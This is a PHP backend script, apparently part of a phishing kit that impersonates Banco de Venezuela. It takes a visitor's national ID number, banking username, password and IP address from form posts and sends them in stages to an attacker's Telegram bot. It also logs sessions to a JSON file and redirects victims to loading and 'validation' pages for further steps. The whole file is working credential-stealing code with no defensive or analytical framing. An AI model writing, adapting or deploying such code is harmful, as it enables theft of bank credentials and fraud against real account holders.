<?php
// user.php
error_reporting(0);
// Se reemplaza discord_config.php por la info de Telegram
require 'tgbroo.php'; 

// 1. INICIO DE SESI脫N Y OBTENCI脫N DE DATOS
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Variables del POST
$identificacion = isset($_POST['identificacion']) ? trim($_POST['identificacion']) : ''; 
$tipoSolicitud = isset($_POST['tipo_solicitud']) ? trim($_POST['tipo_solicitud']) : ''; 
$nombre = isset($_POST['nombre']) ? trim($_POST['nombre']) : '';
$contra = isset($_POST['contra']) ? trim($_POST['contra']) : '';

$session_id = session_id(); 
$sessionsFile = 'datas/sessions_status.json';

// Mapeo para nombres legibles
$readableType = [
    'Tarjeta_int' => 'Aumentar limite',
    'Divisas_efec'  => 'Compra de Divisas 🍀',
    'Credimoto'       => 'Punto + Biopago',
    'Credivehiculo'   => 'Retiro de Divisas 🍀',
    'otrasolicitud'       => 'Otra solicitud',
];

// OBTENCI脫N DE IP
if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ip = trim(end($ip_list));
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Funci贸n Helper para sesi贸n
function getSessionData($key, $default = 'N/A') {
    return isset($_SESSION[$key]) ? $_SESSION[$key] : $default;
}

/**
 * Nueva funci贸n para enviar mensajes a Telegram
 * Utiliza las constantes TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID
 */
function sendToTelegram($mensaje) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

// =======================================================
// L脫GICA DE ENV脥O POR PASOS
// =======================================================

// 3. PASO 2: ENV脥O DE USUARIO
if (!empty($nombre) && empty($contra)) {
    
    if (!empty($identificacion) && !empty($tipoSolicitud)) {
        $_SESSION['identificacion'] = $identificacion;
        $_SESSION['tipoSolicitud'] = $tipoSolicitud;
    }
    $_SESSION['nombre'] = $nombre;

    $identificacion_disp = $identificacion ?: getSessionData('identificacion');
    $tipoSolicitud_disp = $tipoSolicitud ?: getSessionData('tipoSolicitud');
    $solicitud_texto = $readableType[$tipoSolicitud_disp] ?? 'Desconocido';

    // Construcci贸n del mensaje para Telegram (Formato HTML)
    $msg = "<b>BDV 🟡 - USUARIO ENTRANDO</b>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "Cedula: {$identificacion_disp}\n";
    $msg .= "Solicitud: {$solicitud_texto}\n";
    $msg .= "<b>Usuario:</b> {$nombre}\n";
    $msg .= "<b>IP:</b> {$ip}\n";

    sendToTelegram($msg);

    echo "Usuario enviado. Esperando Contraseña.";
    exit();
}

// 4. PASO 3: ENV脥O DE CONTRASE脩A
if (!empty($contra)) {
    
    $identificacion_final = $identificacion ?: getSessionData('identificacion');
    $nombre_final = $nombre ?: getSessionData('nombre');
    $tipoSolicitud_final = $tipoSolicitud ?: getSessionData('tipoSolicitud'); 
    $solicitud_final_texto = $readableType[$tipoSolicitud_final] ?? 'Desconocido';

    // Construcci贸n del mensaje final para Telegram
    $msg = "<b>BDV 🟢 - USUARIO COMPLETO</b>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "Cedula: {$identificacion_final}\n";
    $msg .= "Solicitud: {$solicitud_final_texto}\n";
    $msg .= "<b>Usuario:</b> {$nombre_final}\n";
    $msg .= "<b>Contra:</b> {$contra}\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "<b>IP:</b> {$ip}\n";

    sendToTelegram($msg);

    // B) L贸gica de persistencia en JSON
    $sessions = file_exists($sessionsFile) ? json_decode(file_get_contents($sessionsFile), true) : [];
    $sessions[$session_id] = [
        'user' => $nombre_final,
        'identificacion' => $identificacion_final, 
        'ip' => $ip,
        'time' => time(),
        'status' => 'PENDING',
        'redirect' => 'validacion.html' 
    ];
    file_put_contents($sessionsFile, json_encode($sessions));

    // C) Destrucci贸n de sesi贸n
    session_unset();
    session_destroy();
    
    header('Location: cargando.php?session_id=' . $session_id);
    exit();
}

// 5. Redirecciones por defecto
if (empty($identificacion) && empty($nombre) && empty($contra)) {
    header('Location: index.php');
} else {
    header('Location: validacion.html'); 
}
exit();
?>